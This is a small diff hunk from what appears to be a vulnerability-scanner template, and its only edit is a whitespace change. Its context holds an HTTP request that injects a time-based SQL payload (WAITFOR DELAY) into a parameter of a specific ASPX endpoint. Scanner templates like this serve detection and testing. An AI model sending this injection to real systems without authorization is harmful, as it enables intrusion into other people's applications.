@@ -21,7 +21,7 @@ http:
         @timeout: 20s
         GET /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAY%20'0:0:0'--&ywtype=GETParentProjectName HTTP/1.1
         Host: {{Hostname}}
-    
+
     redirects: true
     matchers:
       - type: dsl
